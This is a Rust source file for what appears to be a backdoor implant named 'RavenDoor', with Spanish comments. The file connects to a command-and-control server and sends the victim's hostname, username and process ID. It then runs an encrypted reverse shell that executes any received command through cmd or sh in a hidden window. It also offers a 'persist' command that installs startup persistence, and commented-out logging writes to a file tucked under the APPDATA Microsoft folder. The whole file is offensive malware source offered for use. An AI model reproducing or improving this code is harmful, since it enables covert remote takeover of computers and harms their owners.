use tokio::net::TcpStream;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use std::process::{Command, Stdio};
use std::time::Duration;
use crate::encryption::Encryption;

#[cfg(windows)]
use std::os::windows::process::CommandExt;

// Colores ANSI básicos
const RESET: &str = "\x1b[0m";
const RED: &str = "\x1b[31m";
const GREEN: &str = "\x1b[32m";
const YELLOW: &str = "\x1b[33m";
const BLUE: &str = "\x1b[34m";
const CYAN: &str = "\x1b[36m";
const BRIGHT_RED: &str = "\x1b[91m";
const BRIGHT_GREEN: &str = "\x1b[92m";
const BRIGHT_YELLOW: &str = "\x1b[93m";
const BRIGHT_BLUE: &str = "\x1b[94m";
const BRIGHT_CYAN: &str = "\x1b[96m";

pub async fn connect_to_c2(ip: &str, port: u16, encryption_key: Option<[u8; 32]>) -> Result<(), Box<dyn std::error::Error>> {
    // Generar o usar clave
    let key = encryption_key.unwrap_or_else(Encryption::generate_key);
    let encryption = Encryption::new(&key);
    
    //log_silent(&format!("{}Conectando a {}:{}{}", CYAN, ip, port, RESET));
    //log_silent(&format!("{}Clave encriptación: {}{}", GREEN, Encryption::key_to_hex(&key), RESET));
    //log_silent(&format!("{}IV: {}{}", YELLOW, encryption.get_iv_hex(), RESET));
    
    loop {
        match TcpStream::connect(format!("{}:{}", ip, port)).await {
            Ok(mut stream) => {
                //log_silent(&format!("{}Conectado exitosamente{}", BRIGHT_GREEN, RESET));
                
                // Handshake: enviar IV al servidor
                let handshake = format!("RAVENDOOR_CBC:{}", encryption.get_iv_hex());
                stream.write_all(handshake.as_bytes()).await?;
                stream.flush().await?;
                
                //log_silent(&format!("{}Handshake enviado: {}{}", BRIGHT_CYAN, handshake, RESET));
                
                // Esperar ACK del servidor
                let mut ack_buffer = [0; 3];
                match tokio::time::timeout(Duration::from_secs(5), stream.read_exact(&mut ack_buffer)).await {
                    Ok(Ok(_)) => {
                        if &ack_buffer != b"ACK" {
                            //log_silent(&format!("{}ACK inválido del servidor: {:?}{}", BRIGHT_RED, &ack_buffer, RESET));
                            tokio::time::sleep(Duration::from_secs(3)).await;
                            continue;
                        }
                    }
                    Ok(Err(e)) => {
                        //log_silent(&format!("{}Error leyendo ACK: {}{}", BRIGHT_RED, e, RESET));
                        continue;
                    }
                    Err(_) => {
                        //log_silent(&format!("{}Timeout esperando ACK{}", BRIGHT_YELLOW, RESET));
                        continue;
                    }
                }
                
                //log_silent(&format!("{}Handshake exitoso{}", BRIGHT_GREEN, RESET));
                
                // Enviar banner inicial
                if let Err(e) = send_encrypted_banner(&mut stream, &encryption).await {
                    //log_silent(&format!("{}Error enviando banner: {}{}", BRIGHT_RED, e, RESET));
                    continue;
                }
                
                // Manejar shell encriptada
                if let Err(e) = handle_encrypted_shell(&mut stream, &encryption).await {
                    //log_silent(&format!("{}Error en shell: {}{}", BRIGHT_RED, e, RESET));
                }
                
                //log_silent(&format!("{}Reconectando...{}", BRIGHT_YELLOW, RESET));
                tokio::time::sleep(Duration::from_secs(3)).await;
            }
            Err(e) => {
                //log_silent(&format!("{}Error conectando: {}{}", BRIGHT_RED, e, RESET));
                tokio::time::sleep(Duration::from_secs(5)).await;
            }
        }
    }
}

async fn send_encrypted_banner(stream: &mut TcpStream, encryption: &Encryption) -> Result<(), Box<dyn std::error::Error>> {
    let hostname = whoami::fallible::hostname().unwrap_or_else(|_| "Unknown".to_string());
    let username = whoami::username();
    let pid = std::process::id();
    
    let banner = format!(
        "\n{}=========================================={}\n\
        {}        RAVENDOOR (CBC ENCRYPTED)      {}\n\
        {}=========================================={}\n\
        {}  • Host: {}{}{}\n\
        {}  • User: {}{}{}\n\
        {}  • PID:  {}{}{}\n\n\
        {}raven@door:$ {}",
        BRIGHT_BLUE, RESET,
        BRIGHT_CYAN, RESET,
        BRIGHT_BLUE, RESET,
        BRIGHT_YELLOW, BRIGHT_GREEN, hostname, RESET,
        BRIGHT_YELLOW, BRIGHT_GREEN, username, RESET,
        BRIGHT_YELLOW, BRIGHT_RED, pid, RESET,
        BRIGHT_RED, BRIGHT_BLUE
    );
    
    //log_silent(&format!("{}Enviando banner: {} bytes{}", BRIGHT_CYAN, banner.len(), RESET));
    send_encrypted(stream, encryption, &banner).await?;
    Ok(())
}

async fn handle_encrypted_shell(
    stream: &mut TcpStream, 
    encryption: &Encryption
) -> Result<(), Box<dyn std::error::Error>> {
    let mut buffer = vec![0u8; 65536]; // Buffer dinámico
    
    loop {
        // Leer longitud del mensaje (4 bytes)
        let mut len_bytes = [0u8; 4];
        match stream.read_exact(&mut len_bytes).await {
            Ok(_) => {
                let len = u32::from_be_bytes(len_bytes) as usize;
                
                if len == 0 {
                    //log_silent(&format!("{}Mensaje vacío recibido{}", BRIGHT_YELLOW, RESET));
                    continue;
                }
                
                // Verificar tamaño
                if len > 10 * 1024 * 1024 { // 10MB máximo
                    //log_silent(&format!("{}Mensaje demasiado grande: {} bytes{}", BRIGHT_RED, len, RESET));
                    return Err("Mensaje demasiado grande".into());
                }
                
                // Asegurar que el buffer sea suficientemente grande
                if len > buffer.len() {
                    buffer.resize(len, 0);
                }
                
                // Leer datos encriptados
                let encrypted = &mut buffer[..len];
                match stream.read_exact(encrypted).await {
                    Ok(_) => {}
                    Err(e) => {
                        //log_silent(&format!("{}Error leyendo datos encriptados: {}{}", BRIGHT_RED, e, RESET));
                        return Err(e.into());
                    }
                }
                
                //log_silent(&format!("{}Datos encriptados recibidos: {} bytes{}", BRIGHT_CYAN, len, RESET));
                
                // Desencriptar comando
                let command = match encryption.decrypt(encrypted) {
                    Ok(cmd) => {
                        cmd.trim().to_string()
                    }
                    Err(e) => {
                        //log_silent(&format!("{}Error desencriptando: {}{}", BRIGHT_RED, e, RESET));
                        // Enviar mensaje de error al servidor
                        let error_msg = format!("{}[✗]{} Error desencriptando comando: {}", 
                            BRIGHT_RED, RESET, e);
                        let _ = send_encrypted(stream, encryption, &error_msg).await;
                        continue;
                    }
                };
                
                if command.is_empty() {
                    let prompt = format!("{}raven@door:$ {}", BRIGHT_RED, BRIGHT_BLUE);
                    send_encrypted(stream, encryption, &prompt).await?;
                    continue;
                }
                
                // Comandos especiales
                match command.to_lowercase().as_str() {
                    "exit" | "quit" => {
                        let response = format!("{}[+]{} Saliendo...", BRIGHT_GREEN, RESET);
                        send_encrypted(stream, encryption, &response).await?;
                        return Ok(());
                    }
                    "help" => {
                        let help = format!(
                            "\n{}=== Comandos Disponibles ==={}\n\
                            {}help{}       - Muestra este menú\n\
                            {}clear/cls{}  - Limpia pantalla\n\
                            {}persist{}    - Instala persistencia\n\
                            {}exit/quit{}  - Cierra sesión\n\
                            {}<cualquier comando>{} - Ejecuta en CMD",
                            BRIGHT_CYAN, RESET,
                            BRIGHT_GREEN, RESET,
                            BRIGHT_GREEN, RESET,
                            BRIGHT_GREEN, RESET,
                            BRIGHT_GREEN, RESET,
                            BRIGHT_YELLOW, RESET
                        );
                        send_encrypted(stream, encryption, &help).await?;
                        continue;
                    }
                    "clear" | "cls" => {
                        send_encrypted(stream, encryption, "\x1b[2J\x1b[H").await?;
                        send_encrypted_banner(stream, encryption).await?;
                        continue;
                    }
                    "persist" => {
                        crate::persistence::install("startup");
                        let response = format!("{}[✓]{} Persistencia instalada", 
                            BRIGHT_GREEN, RESET);
                        send_encrypted(stream, encryption, &response).await?;
                        continue;
                    }
                    _ => {}
                }
                
                // Ejecutar comando
                let output = execute_command_hidden(&command);
                
                // Enviar respuesta SIN prompt - solo la salida del comando
                if let Err(e) = send_encrypted(stream, encryption, &output).await {
                    //log_silent(&format!("{}Error enviando respuesta: {}{}", BRIGHT_RED, e, RESET));
                    return Err(e);
                }
            }
            Err(e) => {
                //log_silent(&format!("{}Error de lectura: {}{}", BRIGHT_RED, e, RESET));
                return Err(e.into());
            }
        }
    }
}

async fn send_encrypted(
    stream: &mut TcpStream, 
    encryption: &Encryption, 
    data: &str
) -> Result<(), Box<dyn std::error::Error>> {
    // Encriptar datos
    let encrypted = match encryption.encrypt(data) {
        Ok(enc) => {
            //log_silent(&format!("{}Datos encriptados: {} bytes{}", BRIGHT_CYAN, enc.len(), RESET));
            enc
        }
        Err(e) => {
            //log_silent(&format!("{}Error encriptando datos: {}{}", BRIGHT_RED, e, RESET));
            return Err(e.into());
        }
    };
    
    // Enviar longitud (4 bytes big-endian)
    let len = encrypted.len() as u32;
    stream.write_all(&len.to_be_bytes()).await?;
    
    // Enviar datos encriptados
    stream.write_all(&encrypted).await?;
    stream.flush().await?;
    
    Ok(())
}

fn execute_command_hidden(cmd: &str) -> String {
    let parts: Vec<&str> = cmd.split_whitespace().collect();
    
    if parts.is_empty() {
        return String::new();
    }
    
    // Manejar comando cd
    if parts[0] == "cd" && parts.len() > 1 {
        return match std::env::set_current_dir(parts[1]) {
            Ok(_) => {
                let new_dir = std::env::current_dir()
                    .map(|p| p.display().to_string())
                    .unwrap_or_else(|_| "Unknown".to_string());
                format!("{}[✓]{} Directorio cambiado a: {}{}{}", 
                    BRIGHT_GREEN, RESET, BRIGHT_BLUE, new_dir, RESET)
            }
            Err(e) => format!("{}[✗]{} Error: {}", BRIGHT_RED, RESET, e),
        };
    }
    
    // Ejecutar comando del sistema
    let output = if cfg!(windows) {
        let mut process = Command::new("cmd");
        process.args(&["/C", cmd])
               .stdout(Stdio::piped())
               .stderr(Stdio::piped())
               .creation_flags(0x08000000); // CREATE_NO_WINDOW
        process.output()
    } else {
        Command::new("sh")
            .arg("-c")
            .arg(cmd)
            .stdout(Stdio::piped())
            .stderr(Stdio::piped())
            .output()
    };
    
    match output {
        Ok(output) => {
            let stdout = String::from_utf8_lossy(&output.stdout);
            let stderr = String::from_utf8_lossy(&output.stderr);
            
            let mut result = String::new();
            
            if !stderr.is_empty() {
                result.push_str(&format!("{}[!]{} {}\n", BRIGHT_RED, RESET, stderr));
            }
            
            if !stdout.is_empty() {
                result.push_str(&colorize_output(&stdout));
            }
            
            if output.status.success() && stdout.is_empty() && stderr.is_empty() {
                result.push_str(&format!("{}[✓]{} Comando ejecutado", BRIGHT_GREEN, RESET));
            }
            
            result
        }
        Err(e) => format!("{}[✗]{} Error: {}", BRIGHT_RED, RESET, e),
    }
}

fn colorize_output(output: &str) -> String {
    let mut result = String::new();
    
    for line in output.lines() {
        let line_lower = line.to_lowercase();
        
        if line_lower.contains("error") || line.contains("ERROR") {
            result.push_str(&format!("{}{}{}\n", RED, line, RESET));
        } else if line_lower.contains("warning") || line.contains("WARNING") {
            result.push_str(&format!("{}{}{}\n", YELLOW, line, RESET));
        } else if line_lower.contains("success") || line_lower.contains("completed") 
                || line.contains("SUCCESS") || line.contains("COMPLETED") {
            result.push_str(&format!("{}{}{}\n", GREEN, line, RESET));
        } else if line.contains(".exe") || line.contains(".dll") || line.contains(".sys") 
                || line.contains(".bat") || line.contains(".ps1") {
            result.push_str(&format!("{}{}{}\n", CYAN, line, RESET));
        } else if line.contains("192.168") || line.contains("10.") || line.contains("172.") 
                || line.contains("127.0.0.1") || line.contains("localhost") {
            result.push_str(&format!("{}{}{}\n", BRIGHT_BLUE, line, RESET));
        } else if line.contains("C:\\") || line.contains("D:\\") || line.contains("E:\\") {
            result.push_str(&format!("{}{}{}\n", BRIGHT_YELLOW, line, RESET));
        } else {
            result.push_str(&format!("{}\n", line));
        }
    }
    
    result
}

/*fn log_silent(msg: &str) {
    if let Ok(appdata) = std::env::var("APPDATA") {
        let log_path = format!("{}\\Microsoft\\Windows\\ravendoor.log", appdata);
        let _ = std::fs::OpenOptions::new()
            .create(true)
            .append(true)
            .open(&log_path)
            .and_then(|mut file| {
                use std::io::Write;
                let timestamp = std::time::SystemTime::now()
                    .duration_since(std::time::UNIX_EPOCH)
                    .unwrap_or_default()
                    .as_secs();
                let hours = (timestamp / 3600) % 24;
                let minutes = (timestamp / 60) % 60;
                let seconds = timestamp % 60;
                
                file.write_all(
                    format!("[{:02}:{:02}:{:02}] {}\n", hours, minutes, seconds, msg)
                        .as_bytes()
                )
            });
    }
}
*/
